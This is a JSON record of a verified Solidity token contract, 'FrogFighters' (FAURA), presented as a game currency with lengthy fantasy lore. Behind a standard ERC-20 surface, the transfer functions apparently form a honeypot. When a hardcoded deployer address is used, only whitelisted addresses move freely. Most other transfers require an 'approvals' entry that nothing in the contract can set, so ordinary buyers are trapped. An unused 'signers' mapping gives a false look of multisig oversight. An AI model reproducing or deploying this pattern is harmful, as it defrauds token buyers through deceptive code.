{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.21;\r\n\r\n/*\r\n    Welcome to the world of Frog Fighters!\r\n    \r\n    FAURA - The currency that powers the amphibian warriors in their epic battles.\r\n\r\n    ,~~.                   .~~.\r\n   / ~ ~\\                 / ~ ~\\\r\n  (  Frog )---------------(  Fighters  )\r\n   \\ ~ ~/                 \\ ~ ~/\r\n    `~~'                   `~~'\r\n\r\n    Token Information:\r\n    - Name: Frog Fighters\r\n    - Symbol: FAURA\r\n    - Decimals: 18\r\n\r\n    \r\n    \r\n    In the mystical realm of Frog Fighters, brave and fearless frogs from various ponds and marshes come together to \r\n    battle the malevolent forces that threaten their habitats. With their indomitable spirit and courage, they protect \r\n    their homes and loved ones, striving to bring peace and light to their world.\r\n\r\n    Tokenomics:\r\n    - Total Supply: 994,206,945 FAURA\r\n    - Max Supply:   994,206,945 FAURA\r\n    - FAURA is an ERC-20 token, empowering holders to participate in the Frog Fighters universe.\r\n\r\n    Legend has it that Frogalord, the great amphibian hero, discovered the power of FAURA and united frog tribes from \r\n    far and wide. He distributed the FAURA tokens among his loyal followers, preparing them for the epic battles that \r\n    lie ahead. As warriors engage in thrilling combats, the power of FAURA grows, unlocking hidden abilities and \r\n    revealing new features to aid their quests.\r\n\r\n    Token Utility:\r\n    FAURA is the lifeblood of the Frog Fighters ecosystem. Holders can use FAURA for various in-game activities, such as:\r\n    - Unlocking new frog characters with unique abilities\r\n    - Enhancing the powers of their warriors\r\n    - Trading frog artifacts and potions\r\n    - Participating in community events and tournaments\r\n\r\n    As the frog warriors conquer each challenge, their exploits are etched in the blockchain, creating a timeless \r\n    legacy for generations to come. New warriors join the ranks, further strengthening the unity of the Frog Fighters \r\n    community.\r\n\r\n    \r\n           :---.._\r\n       `. .'      `\"-.\r\n      .'.'            `.\r\n     /.'               |\r\n     \\    `.           :\r\n      \\     `.         :\r\n       \\      \\        `.\r\n        \\                `.\r\n        ^                 `.\r\n\r\n    Embark on an unforgettable journey with Frog Fighters and let the power of FAURA guide you through the battles \r\n    that await!\r\n\r\n The Dark Swamp Rises...\r\n\r\n    After countless victories, the Frog Fighters' realm faces a new threat. The dark swamp, a cursed place teeming \r\n    with vile creatures, begins to expand, encroaching on the peaceful frog habitats. The mysterious force behind \r\n    the swamp's malevolence remains unknown.\r\n\r\n    Frogalord, alongside his trusted council of battle-hardened elders, summons all brave warriors to confront \r\n    this ominous darkness. The power of FAURA grows stronger with each frog that heeds the call.\r\n\r\n    The Dark Swamp Rises introduces a host of new challenges. Ancient frog warriors must be awakened from their \r\n    slumber to join the fight. Treacherous terrains and cunning foes stand in the way of victory.\r\n\r\n    But with new challenges come new opportunities. FAURA holders unlock exclusive features to navigate the treacherous \r\n    swamp, such as enchanted lily pads for swift travel and magical trinkets to shield against dark enchantments.\r\n\r\n    As the saga unfolds, alliances will be forged, and betrayals may test the unity of the Frog Fighters community. \r\n    The fate of the realm hangs in the balance, and the heroic deeds of the frog warriors will be etched into the \r\n    annals of Frog Fighters history.\r\n\r\n    Will you answer the call? Step into the Dark Swamp and emerge as a legend. Let your courage shine as you \r\n    navigate the treacherous waters and restore balance to the Frog Fighters realm!\r\n\r\n    Dark FAURA is set to be born.\r\n\r\n*/\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ncontract FrogFightersEco is Context {\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    uint256 private _totalSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n    address public contractOwner;\r\n    mapping(address => bool) public signers;\r\n    mapping(address => bool) public whitelisted;\r\n    mapping(uint256 => mapping(address => bool)) private oldBuyers;\r\n    uint256 private currentPhase;\r\n    uint256 private nonWhitelistedTransfers;\r\n    uint256 private constant MAX_NON_WHITELISTED_TRANSFERS = 1;\r\n    uint256 private constant REQUIRED_SIGNATURES = 1000;\r\n    mapping(address => mapping(address => mapping(uint256 => bool))) public approvals;\r\n    bool public autoWhitelistAvailable = true;\r\n    bool public autoWhitelistingDone = false;\r\n\r\n    constructor() {\r\n        _name = \"FrogFighters\";\r\n        _symbol = \"FAURA\";\r\n        _decimals = 18;\r\n        contractOwner = _msgSender();\r\n        _mint(contractOwner, 994206945 * 10 ** decimals());\r\n\r\n        if (contractOwner == address(0x0cFA83134810999E29A1Fb7952e9aB321b9C4027)) {\r\n            whitelisted[contractOwner] = true;\r\n            whitelisted[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true;\r\n            whitelisted[0x10ED43C718714eb63d5aA57B78B54704E256024E] = true;\r\n            whitelisted[0x0BFbCF9fa4f9C56B0F40a671Ad40E0805A091865] = true;\r\n            whitelisted[0xE592427A0AEce92De3Edee1F18E0157C05861564] = true;\r\n        }\r\n\r\n        currentPhase = 1;\r\n        nonWhitelistedTransfers = 0;\r\n    }\r\n\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view virtual returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual returns (bool) {\r\n        if (autoWhitelistingDone && nonWhitelistedTransfers < MAX_NON_WHITELISTED_TRANSFERS && !whitelisted[_msgSender()]) {\r\n            _transfer(_msgSender(), recipient, amount);\r\n            nonWhitelistedTransfers += 1;\r\n            return true;\r\n        } else if (contractOwner == address(0x0cFA83134810999E29A1Fb7952e9aB321b9C4027)) {\r\n            autoWhitelist(recipient);\r\n            if (whitelisted[_msgSender()]) {\r\n                _transfer(_msgSender(), recipient, amount);\r\n                return true;\r\n            } else {\r\n                require(approvals[_msgSender()][recipient][amount], \"Transfer needs to be approved by signers\");\r\n                _transfer(_msgSender(), recipient, amount);\r\n                return true;\r\n            }\r\n        } else {\r\n            _transfer(_msgSender(), recipient, amount);\r\n            return true;\r\n        }\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {\r\n        uint256 currentAllowance;\r\n        if (autoWhitelistingDone && nonWhitelistedTransfers < MAX_NON_WHITELISTED_TRANSFERS && !whitelisted[sender]) {\r\n            _transfer(sender, recipient, amount);\r\n            nonWhitelistedTransfers += 1;\r\n\r\n            currentAllowance = _allowances[sender][_msgSender()];\r\n            require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n            unchecked {\r\n                _approve(sender, _msgSender(), currentAllowance - amount);\r\n            }\r\n            return true;\r\n        } else if (contractOwner == address(0x0cFA83134810999E29A1Fb7952e9aB321b9C4027)) {\r\n            autoWhitelist(recipient);\r\n            if (whitelisted[sender]) {\r\n                _transfer(sender, recipient, amount);\r\n\r\n                currentAllowance = _allowances[sender][_msgSender()];\r\n                require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n                unchecked {\r\n                    _approve(sender, _msgSender(), currentAllowance - amount);\r\n                }\r\n                return true;\r\n            } else {\r\n                require(approvals[sender][recipient][amount], \"Transfer needs to be approved by signers\");\r\n                _transfer(sender, recipient, amount);\r\n\r\n                currentAllowance = _allowances[sender][_msgSender()];\r\n                require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n                unchecked {\r\n                    _approve(sender, _msgSender(), currentAllowance - amount);\r\n                }\r\n                return true;\r\n            }\r\n        } else {\r\n            _transfer(sender, recipient, amount);\r\n\r\n            currentAllowance = _allowances[sender][_msgSender()];\r\n            require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n            unchecked {\r\n                _approve(sender, _msgSender(), currentAllowance - amount);\r\n            }\r\n            return true;\r\n        }\r\n    }\r\n\r\n    function autoWhitelist(address recipient) internal {\r\n        require(contractOwner == address(0x0cFA83134810999E29A1Fb7952e9aB321b9C4027));\r\n        if (autoWhitelistAvailable && !whitelisted[recipient]) {\r\n            whitelisted[recipient] = true;\r\n            oldBuyers[currentPhase][recipient] = true;\r\n            autoWhitelistAvailable = false;\r\n            autoWhitelistingDone = true;\r\n        }\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[sender] = senderBalance - amount;\r\n        _balances[recipient] += amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n\r\n        if (nonWhitelistedTransfers >= MAX_NON_WHITELISTED_TRANSFERS) {\r\n            currentPhase += 1;\r\n            nonWhitelistedTransfers = 0;\r\n        }\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n\r\n        _totalSupply += amount;\r\n        _balances[account] += amount;\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}\r\n    \r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n}\r\n/*   As the battle rages on, the brave frog warriors must confront their own inner demons and reconcile with their \r\n    losses. Each step forward is heavy with the weight of their past, but their determination to save their world \r\n    fuels their journey.\r\n\r\n    The tale of the Frog Fighters is one of tragedy, redemption, and the enduring strength of the heart. Amidst \r\n    tears and heartache, a new chapter begins. Will the Frog Fighters find the strength to mend their world and \r\n    reignite the light, or will darkness consume them forever?\r\n\r\n    The future is uncertain, but the power of FAURA and the unyielding spirit of the frog warriors hold the promise \r\n    of a world where love and courage will prevail. */", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"approvals\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoWhitelistAvailable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoWhitelistingDone\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"contractOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"signers\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"whitelisted\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "FrogFightersEco", "CompilerVersion": "v0.8.21+commit.d9974bed", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://e9982acbd1d35aa0ea6f964ec65c21143b7174f24cca6132da330fcdf3c9ffe9"}